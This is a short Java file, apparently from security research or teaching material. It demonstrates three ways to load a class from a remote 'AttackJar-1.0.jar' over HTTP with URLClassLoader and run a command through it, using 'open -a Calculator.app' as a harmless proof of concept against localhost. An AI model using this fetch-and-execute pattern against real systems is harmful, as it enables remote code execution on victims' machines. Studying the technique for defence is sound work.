package org.example;

import java.net.URL;
import java.net.URLClassLoader;

/**
 * @author Whoopsunix
 */
public class Run {
    public static void main(String[] args) throws Exception{
        /**
         * 调用 static
         */
//        URL url = new URL("http:///127.0.0.1:1234/AttackJar-1.0.jar");
//        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
//        Class<?> loadedClass = classLoader.loadClass("org.example.Exec");
//        Object object = loadedClass.newInstance();

        /**
         * 调用构造方法
         */
//        URL url = new URL("http:///127.0.0.1:1234/AttackJar-1.0.jar");
//        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
//        Class<?> loadedClass = classLoader.loadClass("org.example.ExecArg");
//        Object object = loadedClass.getConstructor(String.class).newInstance("open -a Calculator.app");

        /**
         * 调用方法
         */
        URL url = new URL("http:///127.0.0.1:1234/AttackJar-1.0.jar");
        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});
        Class<?> loadedClass = classLoader.loadClass("org.example.ExecArg");
        Object object = loadedClass.newInstance();
        loadedClass.getMethod("exec", String.class).invoke(object, "open -a Calculator.app");

    }
}
